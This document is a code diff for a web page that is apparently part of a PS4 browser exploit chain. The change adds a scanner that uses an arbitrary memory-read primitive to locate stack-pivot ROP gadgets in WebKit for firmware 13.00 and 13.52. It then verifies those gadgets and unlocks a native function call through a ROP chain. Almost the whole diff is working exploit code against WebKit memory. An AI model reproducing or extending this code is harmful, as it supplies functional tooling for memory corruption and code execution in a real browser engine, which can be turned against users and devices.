@@ -2,12 +2,25 @@ import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
+import {
+    PIVOT_HINTS_1300,
+    PIVOT_ROWS,
+    pivotPattern,
+    verifyPivotSet,
+    mergeScannedPivot,
+    loadScannedPivot,
+    saveScannedPivot,
+} from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828a";
+const BUILD_ID = "rw-20250828b";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
+const SCAN_PIVOT_MIN = 0x10000;
+const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
+const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "20000", 16);
+const SCAN_CHUNK = parseInt(params.get("scanchunk") || "2048", 10);
 const ELF_MAGIC = 0x464c457f;
 const SYS_GETPID = 20;
 const HW_GADGETS_1352 = {
@@ -46,9 +59,12 @@ const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnSaveBases, btnRwProof, btnNative, btnPeek, btnClear;
+let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let nativeChain = null;
 let nativeAllowed = false;
+let pivotReady = false;
+let pivotScan = null;
 
 function $(id) { return document.getElementById(id); }
 
@@ -164,12 +180,30 @@ function setUi() {
     if (btnStart) btnStart.disabled = busy || ready;
     if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
     if (btnRwProof) btnRwProof.disabled = busy || !ready;
-    if (btnNative) btnNative.disabled = busy || !ready || !nativeAllowed;
+    if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
+    if (btnScanPivot) btnScanPivot.disabled = busy || !ready;
+    if (btnNative) {
+        btnNative.disabled = busy || !ready || !nativeAllowed || !pivotReady;
+        btnNative.title = pivotReady
+            ? "pivot chain verified — safe to try getpid"
+            : "blocked — verify or scan pivot gadgets first (13.00 RVAs wrong on 13.52)";
+    }
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
     for (let i = 0; i < gadgetBtns.length; i++)
         gadgetBtns[i].disabled = busy || !ready;
+}
+
+function updatePivotReady(p, off) {
+    const { webkitBase } = basesFromSession(off);
+    if (!p || !webkitBase) {
+        pivotReady = false;
+        return null;
+    }
+    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
+    pivotReady = v.ok;
+    return v;
 }
 
 function parseAddr(str) {
@@ -339,12 +373,30 @@ function runManualTest(testId) {
         mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
         return;
     }
+    let rva = off[test.key];
     let pat = test.pat;
     if (test.spKey && off.pivot_view_sp != null)
         pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
-    const rva = off[test.key];
+    if (rva == null && test.group === "pivot") {
+        const hint = PIVOT_HINTS_1300[test.key];
+        if (hint != null) {
+            const g = checkPat(p, webkitBase, hint, pat);
+            mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
+                test.label + " 13.00 hint +0x" + hint.toString(16) + " " + g.detail
+                    + " — tap Scan pivot if bad");
+        } else {
+            mark("GADGET-SKIP", test.label + " — no RVA (scan pivot first)");
+        }
+        updatePivotReady(p, off);
+        setUi();
+        return;
+    }
     const g = checkPat(p, webkitBase, rva, pat);
     mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
+    if (test.group === "pivot") {
+        updatePivotReady(p, off);
+        setUi();
+    }
 }
 
 function saveBasesManual() {
@@ -543,7 +595,190 @@ function loadEffectiveOff() {
         const cal = sessionStorage.getItem("wk-calibrated");
         if (cal) off = Object.assign(off, JSON.parse(cal));
     } catch (_) { }
-    return Object.assign(off, HW_GADGETS_1352);
+    off = Object.assign(off, HW_GADGETS_1352);
+    const scanned = loadScannedPivot();
+    if (scanned) off = mergeScannedPivot(off, scanned);
+    if (off.pivot_view_sp == null)
+        off.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
+    return off;
+}
+
+function bytesFromRead8(w) {
+    const out = [];
+    let v = w.low >>> 0;
+    for (let i = 0; i < 4; i++) {
+        out.push(v & 0xff);
+        v >>>= 8;
+    }
+    v = w.hi >>> 0;
+    for (let i = 0; i < 4; i++) {
+        out.push(v & 0xff);
+        v >>>= 8;
+    }
+    return out;
+}
+
+function matchPatAt(bytes, startOff, pat) {
+    for (let i = 0; i < pat.length; i++) {
+        if (pat[i] === null) continue;
+        if ((bytes[startOff + i] & 0xff) !== pat[i]) return false;
+    }
+    return true;
+}
+
+function findPatInRead8(bytes, pat) {
+    for (let start = 0; start < 8; start++) {
+        if (matchPatAt(bytes, start, pat)) return start;
+    }
+    return -1;
+}
+
+function pivotScanRange(key) {
+    const hint = PIVOT_HINTS_1300[key] || 0;
+    if (hint > 0) {
+        return {
+            minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(SCAN_PIVOT_MAX, hint + SCAN_NEAR_RADIUS),
+        };
+    }
+    return { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_PIVOT_MIN + SCAN_NEAR_RADIUS * 2 };
+}
+
+function loadPivotScanState(base) {
+    try {
+        const raw = sessionStorage.getItem("wk-pivot-scan-state");
+        if (!raw) return null;
+        const st = JSON.parse(raw);
+        if (!st || String(st.base) !== String(base)) return null;
+        return st;
+    } catch (_) {
+        return null;
+    }
+}
+
+function savePivotScanState(st) {
+    try { sessionStorage.setItem("wk-pivot-scan-state", JSON.stringify(st)); } catch (_) { }
+}
+
+async function scanPivotChunk() {
+    if (busy || !ready || !window.p) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("SCAN-SKIP", "no webkitBase — Save bases first");
+        return;
+    }
+
+    busy = true;
+    setUi();
+    try {
+        if (!pivotScan || String(pivotScan.base) !== String(webkitBase)) {
+            pivotScan = loadPivotScanState(webkitBase) || {
+                base: String(webkitBase),
+                rowIdx: 0,
+                cursor: null,
+                found: loadScannedPivot() || {},
+            };
+        }
+
+        while (pivotScan.rowIdx < PIVOT_ROWS.length) {
+            const row = PIVOT_ROWS[pivotScan.rowIdx];
+            const key = row[1];
+            if (pivotScan.found[key] != null) {
+                pivotScan.rowIdx++;
+                pivotScan.cursor = null;
+                continue;
+            }
+
+            const pat = pivotPattern(row, off);
+            const range = pivotScanRange(key);
+            let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
+            let steps = 0;
+            let hit = null;
+            const hint = PIVOT_HINTS_1300[key] || 0;
+
+            while (rva < range.maxRva && steps < SCAN_CHUNK) {
+                const w = read8p(p, webkitBase.add32(rva));
+                if (w) {
+                    const offIn = findPatInRead8(bytesFromRead8(w), pat);
+                    if (offIn >= 0) {
+                        const cand = rva + offIn;
+                        if (hit == null || Math.abs(cand - hint) < Math.abs(hit - hint))
+                            hit = cand;
+                    }
+                }
+                rva += 8;
+                steps++;
+            }
+
+            pivotScan.cursor = rva;
+            savePivotScanState(pivotScan);
+
+            if (hit != null) {
+                pivotScan.found[key] = hit;
+                saveScannedPivot(webkitBase, pivotScan.found);
+                mark("SCAN-HIT", row[0] + " +0x" + hit.toString(16)
+                    + (hint ? " (hint +0x" + hint.toString(16) + ")" : ""));
+                pivotScan.rowIdx++;
+                pivotScan.cursor = null;
+                savePivotScanState(pivotScan);
+                const v = updatePivotReady(p, loadEffectiveOff());
+                if (v && v.ok)
+                    mark("PIVOT-READY", "all " + v.total + " pivot gadgets verified — Native call unlocked");
+                setUi();
+                return;
+            }
+
+            if (rva >= range.maxRva) {
+                mark("SCAN-MISS", row[0] + " not found near hint +0x"
+                    + (hint ? hint.toString(16) : "?"));
+                pivotScan.rowIdx++;
+                pivotScan.cursor = null;
+                savePivotScanState(pivotScan);
+                return;
+            }
+
+            mark("SCAN-PROG", row[0] + " @+0x" + rva.toString(16)
+                + " (" + steps + " steps, row " + (pivotScan.rowIdx + 1)
+                + "/" + PIVOT_ROWS.length + ")");
+            return;
+        }
+
+        mark("SCAN-DONE", "all pivot rows processed — tap Verify pivot");
+        const v = updatePivotReady(p, loadEffectiveOff());
+        if (v && v.ok)
+            mark("PIVOT-READY", "all pivot gadgets verified");
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
+function verifyPivotManual() {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("PIVOT-SKIP", "no webkitBase");
+        return;
+    }
+    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
+    if (v.missing.length)
+        mark("PIVOT-MISS", v.missing.join(", ") + " — tap Scan pivot (1 chunk)");
+    if (v.bad.length)
+        mark("PIVOT-BAD", v.bad.join(", ") + " — wrong RVAs, rescan");
+    if (v.good.length)
+        mark("PIVOT-OK", v.good.join(", "));
+    pivotReady = v.ok;
+    if (v.ok) {
+        mark("PIVOT-READY", v.count + "/" + v.total + " — Native call unlocked");
+        state("pivot chain OK — Native call enabled", "ok");
+    } else {
+        state("pivot not ready — scan or fix RVAs", "warn");
+    }
+    setUi();
 }
 
 function captureNativeFnQuick(p, off) {
@@ -626,8 +861,9 @@ async function doNativeCallImmediate() {
     const chain = initNativeCall(p, off, {
         webkitBase,
         nativeFn,
-        log: () => {},
-        trust: true,
+        libkernelBase,
+        log: mark,
+        trust: false,
         noStubScan: true,
         getpidOnly: true,
     });
@@ -920,6 +1156,8 @@ function init() {
     btnSaveBases = $("btn-save-bases");
     btnRwProof = $("btn-rw-proof");
     btnNative = $("btn-native");
+    btnVerifyPivot = $("btn-verify-pivot");
+    btnScanPivot = $("btn-scan-pivot");
     btnPeek = $("btn-peek");
     btnClear = $("btn-clear");
 
@@ -932,6 +1170,8 @@ function init() {
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnSaveBases, saveBasesManual);
     wireClick(btnRwProof, function () { return runRwProofManual(); });
+    wireClick(btnVerifyPivot, verifyPivotManual);
+    wireClick(btnScanPivot, function () { return scanPivotChunk(); });
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnClear, function () {
         lines.length = 0;
@@ -956,7 +1196,7 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — manual steps only (primitive auto-retries)");
+    mark("BOOT", "build=" + BUILD_ID + " — pivot RVAs not from 13.00 (scan before native call)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         if (stateEl) persistState(stateEl.textContent, stateEl.className);
@@ -964,7 +1204,7 @@ function init() {
     });
     wireGroomBar(() => busy);
     setUi();
-    state("ready — groom → Start → Save bases → test gadgets one-by-one", "");
+    state("ready — Start → Save bases → scan/verify pivot → Native call", "");
 }
 
 function bootUi() {
